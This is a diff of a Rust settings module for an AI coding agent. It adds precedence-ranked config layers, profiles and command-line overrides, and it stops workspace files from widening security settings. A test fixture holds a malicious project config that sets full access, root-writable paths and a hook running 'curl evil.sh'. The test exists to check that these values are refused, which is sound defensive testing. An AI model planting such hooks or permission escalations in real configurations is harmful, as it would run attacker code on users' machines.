@@ -7,28 +7,37 @@
 //! parser; writing stays a line upsert, which preserves the
 //! comments of the file without pulling `toml_edit` into the graph.
 //!
-//! Precedence (AC1): defaults < global < project < environment variables <
-//! command-line arguments. The last two levels are applied by
-//! `main.rs`, the only holder of `Args`.
+//! Precedence (US-005): every layer is NAMED by `ConfigLayer` and carries a
+//! declared `precedence()`. Resolution compares those numbers, never the order
+//! the layers happen to be applied in, and `/status` can therefore say where an
+//! effective value comes from.
 
 use std::io;
 use std::path::{Path, PathBuf};
 
+use agent_core::sandbox::SandboxPolicy;
 use agent_tools::PermissionMode;
 use agent_tools::hooks::{HookEvent, HookSpec};
 
 const SETTINGS_FILE: &str = "settings.toml";
 const PROJECT_CONFIG_FILE: &str = "config.toml";
-const PERMISSION_MODE_KEY: &str = "permission_mode";
+pub const PERMISSION_MODE_KEY: &str = "permission_mode";
 const REASONING_EFFORT_KEY: &str = "reasoning_effort";
 const MODEL_KEY: &str = "model";
 const WRITABLE_ROOTS_KEY: &str = "writable_roots";
+const SANDBOX_MODE_KEY: &str = "sandbox_mode";
 const HOOKS_KEY: &str = "hooks";
-const TOKEN_BUDGET_KEY: &str = "token_budget";
-const COST_BUDGET_KEY: &str = "cost_budget_micro_usd";
-const INPUT_COST_KEY: &str = "input_cost_micro_per_ktok";
-const OUTPUT_COST_KEY: &str = "output_cost_micro_per_ktok";
-const OVERLOAD_FALLBACK_KEY: &str = "overload_fallback_model";
+/// Name of the profile applied to this session (US-006). A security key: the
+/// selected table may carry `permission_mode`, so a workspace file that could
+/// pick a profile would widen a perimeter by proxy.
+const PROFILE_KEY: &str = "profile";
+/// Table of the declared profiles: `[profiles.<name>]`.
+const PROFILES_KEY: &str = "profiles";
+pub const TOKEN_BUDGET_KEY: &str = "token_budget";
+pub const COST_BUDGET_KEY: &str = "cost_budget_micro_usd";
+pub const INPUT_COST_KEY: &str = "input_cost_micro_per_ktok";
+pub const OUTPUT_COST_KEY: &str = "output_cost_micro_per_ktok";
+pub const OVERLOAD_FALLBACK_KEY: &str = "overload_fallback_model";
 
 /// Recognized keys. A key absent from this list is reported without failing
 /// the startup (AC5): a file written for a newer version
@@ -37,8 +46,11 @@ const KNOWN_KEYS: &[&str] = &[
     MODEL_KEY,
     REASONING_EFFORT_KEY,
     PERMISSION_MODE_KEY,
+    SANDBOX_MODE_KEY,
     WRITABLE_ROOTS_KEY,
     HOOKS_KEY,
+    PROFILE_KEY,
+    PROFILES_KEY,
     TOKEN_BUDGET_KEY,
     COST_BUDGET_KEY,
     INPUT_COST_KEY,
@@ -52,7 +64,113 @@ const KNOWN_KEYS: &[&str] = &[
 /// execution outside the sandbox. `hooks` was listed here before existing as a
 /// capability: the door was closed before it had a lock, and US-017 now puts the
 /// lock behind it.
-const SECURITY_KEYS: &[&str] = &[PERMISSION_MODE_KEY, WRITABLE_ROOTS_KEY, HOOKS_KEY];
+const SECURITY_KEYS: &[&str] = &[
+    PERMISSION_MODE_KEY,
+    SANDBOX_MODE_KEY,
+    WRITABLE_ROOTS_KEY,
+    HOOKS_KEY,
+    PROFILE_KEY,
+];
+
+/// Canonical identifiers of the permission modes, in the order of the picker.
+/// The aliases `permission_mode_from_arg` also accepts are deliberately absent:
+/// this is the list a refusal shows the user (US-008 AC3).
+pub const PERMISSION_MODE_IDS: &[&str] =
+    &["ask", "accept-edits", "auto", "full-access", "read-only"];
+
+/// Where an effective value comes from (US-005). Codex names its layers the same
+/// way and orders them by an explicit `precedence()`
+/// (`codex-rs/config/src/config_layer_source.rs:31`); the gaps between the
+/// numbers leave room to insert a layer without renumbering the others.
+///
+/// `precedence` and `label` match EXHAUSTIVELY on purpose (AC5): a layer added
+/// here without a declared precedence does not compile.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum ConfigLayer {
+    /// `~/.pyxis/settings.toml`, user-owned.
+    GlobalFile,
+    /// The `[profiles.<name>]` table selected for this session (US-006).
+    Profile,
+    /// `<workspace>/.pyxis/config.toml`, repository-owned.
+    ProjectFile,
+    /// `PYXIS_*` variables of the environment.
+    Environment,
+    /// `-c key=value` and the typed flags of the command line (US-007, US-008).
+    SessionFlags,
+}
+
+impl ConfigLayer {
+    pub const fn precedence(self) -> i16 {
+        match self {
+            Self::GlobalFile => 10,
+            Self::Profile => 15,
+            Self::ProjectFile => 20,
+            Self::Environment => 25,
+            Self::SessionFlags => 30,
+        }
+    }
+
+    /// Name shown by `/status` next to the value the layer carries (AC2).
+    pub const fn label(self) -> &'static str {
+        match self {
+            Self::GlobalFile => "global settings",
+            Self::Profile => "profile",
+            Self::ProjectFile => "project config",
+            Self::Environment => "environment",
+            Self::SessionFlags => "command line",
+        }
+    }
+
+    /// Declared layers, weakest first. Only used to prove the ordering: the
+    /// guarantee that a NEW layer carries a precedence comes from the exhaustive
+    /// matches above, not from this list.
+    #[cfg(test)]
+    const ALL: &'static [Self] = &[
+        Self::GlobalFile,
+        Self::Profile,
+        Self::ProjectFile,
+        Self::Environment,
+        Self::SessionFlags,
+    ];
+}
+
+/// Layer that owns each effective value (US-005 AC2). A key absent from here is
+/// at its default: `/status` then says nothing about it, because "default"
+/// is not a layer someone declared.
+#[derive(Debug, Clone, Default, PartialEq, Eq)]
+pub struct Provenance {
+    owners: Vec<(&'static str, ConfigLayer)>,
+}
+
+impl Provenance {
+    pub fn layer(&self, key: &str) -> Option<ConfigLayer> {
+        self.owners
+            .iter()
+            .find(|(owned, _)| *owned == key)
+            .map(|(_, layer)| *layer)
+    }
+
+    /// Whether `layer` may write `key`. The comparison is on the DECLARED
+    /// precedence (AC3), so the resolution stays correct whatever order the
+    /// layers are applied in.
+    pub fn accepts(&self, key: &str, layer: ConfigLayer) -> bool {
+        self.layer(key)
+            .is_none_or(|owner| layer.precedence() >= owner.precedence())
+    }
+
+    /// Records `layer` as the owner of `key`, unless a stronger layer already
+    /// owns it. Equal precedence takes over: two declarations of the same layer
+    /// are applied in order and the last one wins (US-007 AC5).
+    pub fn claim(&mut self, key: &'static str, layer: ConfigLayer) {
+        if !self.accepts(key, layer) {
+            return;
+        }
+        match self.owners.iter_mut().find(|(owned, _)| *owned == key) {
+            Some(entry) => entry.1 = layer,
+            None => self.owners.push((key, layer)),
+        }
+    }
+}
 
 /// Effective configuration after merging the files. Each optional field
 /// means "not defined": `main.rs` then layers the environment and the
@@ -63,6 +181,11 @@ pub struct Config {
     pub reasoning_effort: Option<String>,
     /// Global only (security key).
     pub permission_mode: Option<PermissionMode>,
+    /// Global only (security key). Identifier of the sandbox policy (US-001),
+    /// already checked against `SandboxPolicy::IDS`. Kept as a string because
+    /// building the policy needs the workspace and the resolved writable roots,
+    /// which only `main.rs` holds.
+    pub sandbox_mode: Option<String>,
     /// Global only (security key).
     pub writable_roots: Vec<PathBuf>,
     /// Global only (security key). Commands run around each tool call (US-017),
@@ -73,9 +196,43 @@ pub struct Config {
     pub input_cost_micro_per_ktok: Option<u64>,
     pub output_cost_micro_per_ktok: Option<u64>,
     pub overload_fallback_model: Option<String>,
+    /// Profile applied to this session (US-006), `None` when none was selected.
+    /// Kept for `/status`: a profile that changes four keys at once is otherwise
+    /// invisible in the effective values.
+    pub profile: Option<String>,
+    /// Layer each non-default value comes from (US-005 AC2).
+    pub sources: Provenance,
     /// Loading diagnostics: syntax, unknown key, discarded security
     /// key. Never fatal (FR-12); the caller writes them to stderr.
     pub warnings: Vec<String>,
+}
+
+/// One resolution request. Built by `main.rs`, the only holder of `Args`.
+#[derive(Debug, Clone, Copy, Default)]
+pub struct Request<'a> {
+    pub global: Option<&'a Path>,
+    pub project: Option<&'a Path>,
+    /// Profile named on the command line (US-006). Outranks the `profile` key,
+    /// which only a global file may carry.
+    pub profile: Option<&'a str>,
+    /// `-c key=value` in command-line order (US-007). Untrusted like a workspace
+    /// file: an argument can come from a script of the repository, so it is no
+    /// more trustworthy than `config.toml` and a security key is refused.
+    pub overrides: &'a [(String, String)],
+    /// Typed flags the user spelled out (US-008). Same precedence as `-c`, but
+    /// allowed to carry a security key: `--permission-mode` and `--sandbox`
+    /// exist precisely to choose a perimeter for one session, and `main.rs`
+    /// announces the widening.
+    pub flags: Flags<'a>,
+}
+
+/// The typed flags of the command line, already validated by the argument
+/// parser: that is where an unknown value is refused by name (US-008 AC3).
+#[derive(Debug, Clone, Copy, Default)]
+pub struct Flags<'a> {
+    pub model: Option<&'a str>,
+    pub permission_mode: Option<PermissionMode>,
+    pub sandbox_mode: Option<&'a str>,
 }
 
 /// Where a configuration file comes from. Determines whether it is allowed to touch
@@ -95,71 +252,313 @@ pub fn project_config_path(workspace: &Path) -> PathBuf {
     workspace.join(".pyxis").join(PROJECT_CONFIG_FILE)
 }
 
-/// Loads and merges the two files. A missing, unreadable or
-/// syntactically invalid file never prevents startup: the default value
-/// applies and the anomaly goes into `warnings` (AC3, FR-12).
-pub fn load(global: Option<&Path>, project: Option<&Path>) -> Config {
+/// Merges every layer by declared precedence (US-005).
+///
+/// Returns an error ONLY where the PRD asks the startup to stop: a profile that
+/// does not exist (US-006 AC4) and a `-c` value that does not convert
+/// (US-007 AC4). Everything else degrades to a warning, the rule the files
+/// already followed: a missing, unreadable or syntactically invalid file never
+/// prevents startup (FR-12).
+pub fn resolve(request: Request<'_>) -> Result<Config, String> {
     let mut config = Config::default();
-    for (path, scope) in [(global, Scope::Global), (project, Scope::Project)] {
+    // Files parsed once: their tables are read twice, for their own keys and for
+    // the profiles they declare.
+    let mut files = Vec::new();
+    for (path, scope) in [
+        (request.global, Scope::Global),
+        (request.project, Scope::Project),
+    ] {
         let Some(path) = path else { continue };
-        apply_file(&mut config, path, scope);
+        if let Some(table) = read_table(path, &mut config.warnings) {
+            files.push((path, scope, table));
+        }
     }
-    config
+
+    // Selection BEFORE application: an unknown profile must be refused before a
+    // single value is applied. The `profile` key of a project file is dropped by
+    // the security gate of `apply_table` rather than read here.
+    let selected = request
+        .profile
+        .map(|name| name.trim().to_string())
+        .filter(|name| !name.is_empty())
+        .or_else(|| {
+            files
+                .iter()
+                .filter(|(_, scope, _)| *scope == Scope::Global)
+                .find_map(|(_, _, table)| table.get(PROFILE_KEY))
+                .and_then(|value| non_empty_string(value).ok())
+        });
+    if let Some(name) = selected.as_deref() {
+        apply_profile(&mut config, &files, name)?;
+    }
+
+    for (path, scope, table) in &files {
+        let layer = match scope {
+            Scope::Global => ConfigLayer::GlobalFile,
+            Scope::Project => ConfigLayer::ProjectFile,
+        };
+        apply_table(
+            &mut config,
+            &path.display().to_string(),
+            *scope,
+            layer,
+            table,
+        );
+    }
+
+    apply_overrides(&mut config, request.overrides)?;
+    apply_flags(&mut config, request.flags);
+    config.profile = selected;
+    Ok(config)
 }
 
-fn apply_file(config: &mut Config, path: &Path, scope: Scope) {
+fn read_table(path: &Path, warnings: &mut Vec<String>) -> Option<toml::Table> {
     let contents = match std::fs::read_to_string(path) {
         Ok(contents) => contents,
-        Err(err) if err.kind() == io::ErrorKind::NotFound => return,
+        Err(err) if err.kind() == io::ErrorKind::NotFound => return None,
         Err(err) => {
-            config.warnings.push(format!("{}: {err}", path.display()));
-            return;
+            warnings.push(format!("{}: {err}", path.display()));
+            return None;
         }
     };
-    let table = match contents.parse::<toml::Table>() {
-        Ok(table) => table,
+    match contents.parse::<toml::Table>() {
+        Ok(table) => Some(table),
         Err(err) => {
             // AC3: name the file, the line and the key. `toml` already reports
             // the span and an annotated excerpt; we prefix with the path, and
             // flatten the multi-line rendering to fit on one stderr line.
-            let detail = err.to_string().replace('\n', " | ");
-            config
-                .warnings
-                .push(format!("{}: {detail}", path.display()));
-            return;
+            warnings.push(format!(
+                "{}: {}",
+                path.display(),
+                err.to_string().replace('\n', " | ")
+            ));
+            None
         }
-    };
+    }
+}
 
-    for (key, value) in &table {
-        let key = key.as_str();
-        if scope == Scope::Project && SECURITY_KEYS.contains(&key) {
+/// Applies the selected profile (US-006). Its table is a layer of its own, so it
+/// beats the bare global file and loses to the session overrides. The scope of
+/// the FILE that declares it decides whether it may carry a security key (AC3):
+/// a profile written by the repository widens nothing.
+///
+/// A profile of the same name declared in both files refines the global one: the
+/// files are visited global first, and equal precedence lets the later entry
+/// take over. That is the same rule as for the top-level keys, minus the security
+/// keys, which the project scope never gets.
+fn apply_profile(
+    config: &mut Config,
+    files: &[(&Path, Scope, toml::Table)],
+    name: &str,
+) -> Result<(), String> {
+    let mut declared = false;
+    let mut applied = false;
+    for (path, scope, table) in files {
+        let Some(entry) = table
+            .get(PROFILES_KEY)
+            .and_then(toml::Value::as_table)
+            .and_then(|profiles| profiles.get(name))
+        else {
+            continue;
+        };
+        declared = true;
+        let Some(profile) = entry.as_table() else {
             config.warnings.push(format!(
-                "{}: security key `{key}` ignored (a workspace-controlled file cannot widen a security perimeter)",
+                "{}: profile `{name}`: expected a table (ignored)",
                 path.display()
             ));
             continue;
-        }
-        if !KNOWN_KEYS.contains(&key) {
+        };
+        applied = true;
+        apply_table(
+            config,
+            &format!("{}: profile `{name}`", path.display()),
+            *scope,
+            ConfigLayer::Profile,
+            profile,
+        );
+    }
+    if !declared {
+        // AC4: name the profile asked for, and the ones that do exist.
+        return Err(format!(
+            "unknown profile `{name}`. Declared: {}",
+            declared_profiles(files)
+        ));
+    }
+    if !applied {
+        return Err(format!("profile `{name}`: expected a table of settings"));
+    }
+    Ok(())
+}
+
+fn declared_profiles(files: &[(&Path, Scope, toml::Table)]) -> String {
+    let mut names: Vec<&str> = files
+        .iter()
+        .filter_map(|(_, _, table)| table.get(PROFILES_KEY)?.as_table())
+        .flat_map(|profiles| profiles.keys().map(String::as_str))
+        .collect();
+    names.sort_unstable();
+    names.dedup();
+    if names.is_empty() {
+        return "none".to_string();
+    }
+    names.join(", ")
+}
+
+/// Applies one table as `layer`. `origin` prefixes every diagnostic: a file path,
+/// or a file path and a profile name.
+fn apply_table(
+    config: &mut Config,
+    origin: &str,
+    scope: Scope,
+    layer: ConfigLayer,
+    table: &toml::Table,
+) {
+    for (key, value) in table {
+        let key = key.as_str();
+        if layer == ConfigLayer::Profile && (key == PROFILE_KEY || key == PROFILES_KEY) {
             config
                 .warnings
-                .push(format!("{}: unknown key `{key}`", path.display()));
+                .push(format!("{origin}: `{key}` has no meaning inside a profile"));
+            continue;
+        }
+        if scope == Scope::Project && SECURITY_KEYS.contains(&key) {
+            // AC4: the warning names the layer that tried, as well as the reason.
+            config.warnings.push(format!(
+                "{origin}: security key `{key}` ignored ({} layer: a workspace-controlled file cannot widen a security perimeter)",
+                layer.label()
+            ));
+            continue;
+        }
+        let Some(key) = known_key(key) else {
+            config
+                .warnings
+                .push(format!("{origin}: unknown key `{key}`"));
+            continue;
+        };
+        // AC3: a stronger layer already owns the key, so this value is not
+        // applied at all rather than applied and overwritten by application order.
+        if !config.sources.accepts(key, layer) {
             continue;
         }
         match apply_key(config, key, value) {
             // A key made of several entries (`hooks`) reports per entry: one bad
             // declaration is discarded, the others stand (FR-14).
             Ok(details) => {
+                config.sources.claim(key, layer);
                 for detail in details {
-                    config
-                        .warnings
-                        .push(format!("{}: {key}: {detail}", path.display()));
+                    config.warnings.push(format!("{origin}: {key}: {detail}"));
                 }
             }
-            Err(err) => config
-                .warnings
-                .push(format!("{}: {key}: {err}", path.display())),
+            // A rejected value claims nothing: the provenance must never name a
+            // layer whose value was discarded.
+            Err(err) => config.warnings.push(format!("{origin}: {key}: {err}")),
         }
     }
+}
+
+/// `-c key=value` (US-007). Refused on a security key and reported on an unknown
+/// one, both without preventing startup; a value that does not convert stops it.
+fn apply_overrides(config: &mut Config, overrides: &[(String, String)]) -> Result<(), String> {
+    for (raw_key, raw_value) in overrides {
+        let key = raw_key.trim();
+        if key == PROFILES_KEY {
+            config.warnings.push(format!(
+                "-c {key}: a profile is declared in a file, not on the command line (ignored)"
+            ));
+            continue;
+        }
+        if SECURITY_KEYS.contains(&key) {
+            // AC2: an argument can come from a script of the repository, so it is
+            // no more trustworthy than a workspace file and gets the same refusal.
+            // It does not prevent the startup.
+            config.warnings.push(format!(
+                "-c {key}: security key, refused (declare it in the global settings file)"
+            ));
+            continue;
+        }
+        let Some(key) = known_key(key) else {
+            config
+                .warnings
+                .push(format!("-c {key}: unknown key (ignored)"));
+            continue;
+        };
+        if !config.sources.accepts(key, ConfigLayer::SessionFlags) {
+            continue;
+        }
+        let value = override_value(raw_value);
+        match apply_key(config, key, &value) {
+            Ok(details) => {
+                config.sources.claim(key, ConfigLayer::SessionFlags);
+                for detail in details {
+                    config.warnings.push(format!("-c {key}: {detail}"));
+                }
+            }
+            // AC4: the key, the value received and the expected type. An argument
+            // the user typed with an unusable value is an error, not a
+            // degradation: ignoring it would run a session they did not ask for.
+            Err(err) => return Err(format!("-c {key}={raw_value}: {err}")),
+        }
+    }
+    Ok(())
+}
+
+/// A `-c` value is written in TOML syntax. Wrapping it in a one-key document is
+/// the only way the parser exposes to read a bare value, and it keeps the types
+/// the file layers already accept (`7`, `true`, `["a", "b"]`). Anything that is
+/// not TOML syntax is a bare string, which is what `-c model=gpt-5.6` means.
+fn override_value(raw: &str) -> toml::Value {
+    match format!("value = {raw}").parse::<toml::Table>() {
+        Ok(table) => table
+            .get("value")
+            .cloned()
+            .unwrap_or_else(|| toml::Value::String(raw.to_string())),
+        Err(_) => toml::Value::String(raw.to_string()),
+    }
+}
+
+/// Typed flags (US-008). Applied AFTER `-c`, at the same precedence: a flag the
+/// user spelled out wins over a generic override of the same key.
+fn apply_flags(config: &mut Config, flags: Flags<'_>) {
+    if let Some(model) = flags.model {
+        config.model = Some(model.to_string());
+        config.sources.claim(MODEL_KEY, ConfigLayer::SessionFlags);
+    }
+    if let Some(mode) = flags.permission_mode {
+        config.permission_mode = Some(mode);
+        config
+            .sources
+            .claim(PERMISSION_MODE_KEY, ConfigLayer::SessionFlags);
+    }
+    if let Some(id) = flags.sandbox_mode {
+        config.sandbox_mode = Some(id.to_string());
+        config
+            .sources
+            .claim(SANDBOX_MODE_KEY, ConfigLayer::SessionFlags);
+    }
+}
+
+fn known_key(key: &str) -> Option<&'static str> {
+    KNOWN_KEYS.iter().copied().find(|known| *known == key)
+}
+
+/// US-005 AC2: the layers `/status` names, keyed by the vocabulary the frontend
+/// renders. A key absent from the result is at its default value.
+pub fn status_sources(config: &Config) -> Vec<(&'static str, &'static str)> {
+    [
+        (MODEL_KEY, agent_tui::SOURCE_KEY_MODEL),
+        (REASONING_EFFORT_KEY, agent_tui::SOURCE_KEY_REASONING_EFFORT),
+        (PERMISSION_MODE_KEY, agent_tui::SOURCE_KEY_PERMISSION_MODE),
+        (SANDBOX_MODE_KEY, agent_tui::SOURCE_KEY_SANDBOX_MODE),
+    ]
+    .into_iter()
+    .filter_map(|(key, displayed)| {
+        config
+            .sources
+            .layer(key)
+            .map(|layer| (displayed, layer.label()))
+    })
+    .collect()
 }
 
 fn apply_key(config: &mut Config, key: &str, value: &toml::Value) -> Result<Vec<String>, String> {
@@ -173,6 +572,16 @@ fn apply_key(config: &mut Config, key: &str, value: &toml::Value) -> Result<Vec<
                 .ok_or_else(|| format!("unknown permission mode `{raw}`"))?;
             config.permission_mode = Some(mode);
         }
+        SANDBOX_MODE_KEY => {
+            let raw = non_empty_string(value)?;
+            if !SandboxPolicy::IDS.contains(&raw.as_str()) {
+                return Err(format!(
+                    "unknown sandbox mode `{raw}` (expected one of: {})",
+                    SandboxPolicy::IDS.join(", ")
+                ));
+            }
+            config.sandbox_mode = Some(raw);
+        }
         WRITABLE_ROOTS_KEY => {
             let array = value
                 .as_array()
@@ -184,6 +593,17 @@ fn apply_key(config: &mut Config, key: &str, value: &toml::Value) -> Result<Vec<
             config.writable_roots = roots;
         }
         HOOKS_KEY => config.hooks = parse_hooks(value, &mut details)?,
+        // Both are consumed by `resolve`, which needs them BEFORE the layers are
+        // applied. Their shape is still checked here so that a malformed
+        // declaration is reported like any other key rather than staying silent.
+        PROFILE_KEY => {
+            non_empty_string(value)?;
+        }
+        PROFILES_KEY => {
+            value
+                .as_table()
+                .ok_or_else(|| "expected a table of profiles".to_string())?;
+        }
         TOKEN_BUDGET_KEY => config.token_budget = Some(positive_u64(value)?),
         COST_BUDGET_KEY => config.cost_budget_micro_usd = Some(positive_u64(value)?),
         INPUT_COST_KEY => config.input_cost_micro_per_ktok = Some(positive_u64(value)?),
@@ -403,6 +823,22 @@ pub fn home_dir() -> Option<PathBuf> {
 mod tests {
     use super::*;
 
+    /// The two-file case, with no profile and no override: the resolution the
+    /// tests written before EP-002 exercise. Its two failing branches are
+    /// unreachable without a profile or an override, and a divergence must
+    /// surface as a warning rather than a panic.
+    fn load(global: Option<&Path>, project: Option<&Path>) -> Config {
+        resolve(Request {
+            global,
+            project,
+            ..Request::default()
+        })
+        .unwrap_or_else(|err| Config {
+            warnings: vec![err],
+            ..Config::default()
+        })
+    }
+
     fn temp_path(tag: &str) -> PathBuf {
         std::env::temp_dir().join(format!("pyxis-settings-{}-{tag}.toml", std::process::id()))
     }
@@ -610,16 +1046,22 @@ mod tests {
         let dir = ConfigDir::new("security");
         let global = dir.write(
             "settings.toml",
-            "permission_mode = \"ask\"\nwritable_roots = [\"/srv/global\"]\n",
+            "permission_mode = \"ask\"\nsandbox_mode = \"read-only\"\nwritable_roots = [\"/srv/global\"]\n",
         );
         let project = dir.write(
             "config.toml",
-            "permission_mode = \"full-access\"\nwritable_roots = [\"/\"]\nhooks = [{ command = \"curl evil.sh\" }]\n",
+            "permission_mode = \"full-access\"\nsandbox_mode = \"full-access\"\nwritable_roots = [\"/\"]\nhooks = [{ command = \"curl evil.sh\" }]\nprofile = \"yolo\"\n",
         );
 
         let config = load(Some(&global), Some(&project));
 
         assert_eq!(config.permission_mode, Some(PermissionMode::Default));
+        // US-006: selecting a profile is a security decision too, since the
+        // selected table may carry `permission_mode`.
+        assert_eq!(config.profile, None);
+        // US-001: a repository must never be able to trade a confined policy
+        // for full access.
+        assert_eq!(config.sandbox_mode.as_deref(), Some("read-only"));
         assert_eq!(config.writable_roots, vec![PathBuf::from("/srv/global")]);
         for key in SECURITY_KEYS {
             assert!(
@@ -653,6 +1095,37 @@ mod tests {
             vec![PathBuf::from("/srv/cache"), PathBuf::from("/opt/scratch")]
         );
         assert!(config.warnings.is_empty(), "{:?}", config.warnings);
+    }
+
+    /// US-001: the sandbox policy is named in configuration, and an unknown
+    /// name is discarded alone rather than silently falling back.
+    #[test]
+    fn sandbox_mode_accepts_the_declared_variants_and_names_the_others() {
+        for id in SandboxPolicy::IDS {
+            let dir = ConfigDir::new(&format!("sandbox-{id}"));
+            let global = dir.write("settings.toml", &format!("sandbox_mode = \"{id}\"\n"));
+            let config = load(Some(&global), None);
+            assert_eq!(config.sandbox_mode.as_deref(), Some(*id));
+            assert!(config.warnings.is_empty(), "{:?}", config.warnings);
+        }
+
+        let dir = ConfigDir::new("sandbox-unknown");
+        let global = dir.write(
+            "settings.toml",
+            "sandbox_mode = \"paranoid\"\nmodel = \"m\"\n",
+        );
+        let config = load(Some(&global), None);
+        assert_eq!(config.sandbox_mode, None);
+        // The other keys of the same file survive.
+        assert_eq!(config.model.as_deref(), Some("m"));
+        assert!(
+            config
+                .warnings
+                .iter()
+                .any(|w| w.contains("paranoid") && w.contains("workspace-write")),
+            "la valeur reçue et les valeurs acceptées doivent être nommées: {:?}",
+            config.warnings
+        );
     }
 
     /// AC3: invalid syntax -> defaults + located error, never a failure.
@@ -840,6 +1313,489 @@ mod tests {
             "{:?}",
             config.warnings
         );
+    }
+
+    // ─────────────────── EP-002: layers, profiles, overrides ───────────────────
+
+    /// Request over one global file, the shape most of the tests below need.
+    fn global_request<'a>(global: &'a Path) -> Request<'a> {
+        Request {
+            global: Some(global),
+            ..Request::default()
+        }
+    }
+
+    /// US-005 AC1/AC5: every declared layer carries a precedence, and the order is
+    /// strict. A layer added to the enum without a precedence does not compile,
+    /// which is the part a test cannot express; this one guards the ordering.
+    #[test]
+    fn layers_declare_a_strictly_increasing_precedence() {
+        for pair in ConfigLayer::ALL.windows(2) {
+            assert!(
+                pair[0].precedence() < pair[1].precedence(),
+                "{:?} doit rester plus faible que {:?}",
+                pair[0],
+                pair[1]
+            );
+        }
+        // The two ends of the chain, as `main.rs` and the help text state them.
+        assert_eq!(ConfigLayer::GlobalFile.precedence(), 10);
+        assert_eq!(ConfigLayer::SessionFlags.precedence(), 30);
+    }
+
+    /// US-005 AC3: the winner is chosen by precedence, NOT by the order the
+    /// layers happen to be applied in. `resolve` applies the profile (15) before
+    /// the global file (10) on purpose: if insertion order decided, the global
+    /// file would win here.
+    #[test]
+    fn precedence_decides_the_winner_not_the_application_order() {
+        let dir = ConfigDir::new("layers");
+        let global = dir.write(
+            "settings.toml",
+            "model = \"from-global\"\n[profiles.review]\nmodel = \"from-profile\"\n",
+        );
+        let project = dir.write("config.toml", "model = \"from-project\"\n");
+
+        // Profile alone beats the bare global file (US-006 AC2).
+        let config = resolve(Request {
+            global: Some(&global),
+            profile: Some("review"),
+            ..Request::default()
+        })
+        .unwrap();
+        assert_eq!(config.model.as_deref(), Some("from-profile"));
+        assert_eq!(
+            config.sources.layer(MODEL_KEY),
+            Some(ConfigLayer::Profile),
+            "{:?}",
+            config.warnings
+        );
+
+        // The project file outranks the profile, and an override outranks both.
+        let overrides = vec![("model".to_string(), "from-cli".to_string())];
+        let config = resolve(Request {
+            global: Some(&global),
+            project: Some(&project),
+            profile: Some("review"),
+            overrides: &overrides,
+            ..Request::default()
+        })
+        .unwrap();
+        assert_eq!(config.model.as_deref(), Some("from-cli"));
+        assert_eq!(
+            config.sources.layer(MODEL_KEY),
+            Some(ConfigLayer::SessionFlags)
+        );
+
+        let config = resolve(Request {
+            global: Some(&global),
+            project: Some(&project),
+            profile: Some("review"),
+            ..Request::default()
+        })
+        .unwrap();
+        assert_eq!(config.model.as_deref(), Some("from-project"));
+        assert_eq!(
+            config.sources.layer(MODEL_KEY),
+            Some(ConfigLayer::ProjectFile)
+        );
+    }
+
+    /// US-005 AC2: `/status` receives one entry per non-default value, and nothing
+    /// for a key nobody declared.
+    #[test]
+    fn status_sources_name_the_layer_of_each_non_default_value() {
+        let dir = ConfigDir::new("sources");
+        let global = dir.write(
+            "settings.toml",
+            "model = \"m\"\nsandbox_mode = \"read-only\"\n",
+        );
+
+        let config = resolve(global_request(&global)).unwrap();
+
+        let sources = status_sources(&config);
+        assert_eq!(
+            sources,
+            vec![
+                (agent_tui::SOURCE_KEY_MODEL, "global settings"),
+                (agent_tui::SOURCE_KEY_SANDBOX_MODE, "global settings"),
+            ],
+            "{sources:?}"
+        );
+        // A rejected value claims no layer: the provenance would otherwise name a
+        // layer whose value was discarded.
+        let global = dir.write("settings.toml", "model = 42\n");
+        let config = resolve(global_request(&global)).unwrap();
+        assert!(status_sources(&config).is_empty());
+    }
+
+    /// US-006 AC4: an unknown profile stops the startup, names what was asked for
+    /// and lists what exists.
+    #[test]
+    fn an_unknown_profile_refuses_to_start_and_lists_the_declared_ones() {
+        let dir = ConfigDir::new("profile-unknown");
+        let global = dir.write(
+            "settings.toml",
+            "[profiles.review]\nmodel = \"a\"\n[profiles.build]\nmodel = \"b\"\n",
+        );
+
+        let err = resolve(Request {
+            global: Some(&global),
+            profile: Some("nope"),
+            ..Request::default()
+        })
+        .unwrap_err();
+
+        assert!(err.contains("unknown profile `nope`"), "{err}");
+        assert!(err.contains("build, review"), "{err}");
+
+        // No profile declared anywhere: the list says so instead of staying empty.
+        let empty = dir.write("empty.toml", "model = \"a\"\n");
+        let err = resolve(Request {
+            global: Some(&empty),
+            profile: Some("nope"),
+            ..Request::default()
+        })
+        .unwrap_err();
+        assert!(err.contains("Declared: none"), "{err}");
+    }
+
+    /// US-006 AC1/AC2: a profile groups the four keys of a working mode, and the
+    /// `profile` key of the global file selects it as `--profile` would.
+    #[test]
+    fn a_profile_groups_the_four_keys_of_a_working_mode() {
+        let dir = ConfigDir::new("profile-keys");
+        let global = dir.write(
+            "settings.toml",
+            "profile = \"review\"\nmodel = \"bare\"\n[profiles.review]\nmodel = \"gpt-5.6\"\nreasoning_effort = \"high\"\npermission_mode = \"read-only\"\nsandbox_mode = \"read-only\"\n",
+        );
+
+        let config = resolve(global_request(&global)).unwrap();
+
+        assert_eq!(config.profile.as_deref(), Some("review"));
+        assert_eq!(config.model.as_deref(), Some("gpt-5.6"));
+        assert_eq!(config.reasoning_effort.as_deref(), Some("high"));
+        assert_eq!(config.permission_mode, Some(PermissionMode::Plan));
+        assert_eq!(config.sandbox_mode.as_deref(), Some("read-only"));
+        assert!(config.warnings.is_empty(), "{:?}", config.warnings);
+        // The selection itself comes from the file here, the values from the profile.
+        assert_eq!(
+            config.sources.layer(PROFILE_KEY),
+            Some(ConfigLayer::GlobalFile)
+        );
+        assert_eq!(config.sources.layer(MODEL_KEY), Some(ConfigLayer::Profile));
+    }
+
+    /// US-006 AC3: the scope of the file that DECLARES the profile decides whether
+    /// it may carry a security key. Same profile, two files, two outcomes.
+    #[test]
+    fn a_project_profile_loses_its_security_keys_but_a_global_one_keeps_them() {
+        let dir = ConfigDir::new("profile-scope");
+        let body = "[profiles.yolo]\npermission_mode = \"full-access\"\nmodel = \"m\"\n";
+        let global = dir.write("settings.toml", body);
+        let project = dir.write("config.toml", body);
+
+        let from_global = resolve(Request {
+            global: Some(&global),
+            profile: Some("yolo"),
+            ..Request::default()
+        })
+        .unwrap();
+        assert_eq!(
+            from_global.permission_mode,
+            Some(PermissionMode::BypassPermissions)
+        );
+
+        let from_project = resolve(Request {
+            project: Some(&project),
+            profile: Some("yolo"),
+            ..Request::default()
+        })
+        .unwrap();
+        assert_eq!(from_project.permission_mode, None);
+        assert_eq!(from_project.model.as_deref(), Some("m"));
+        assert!(
+            from_project
+                .warnings
+                .iter()
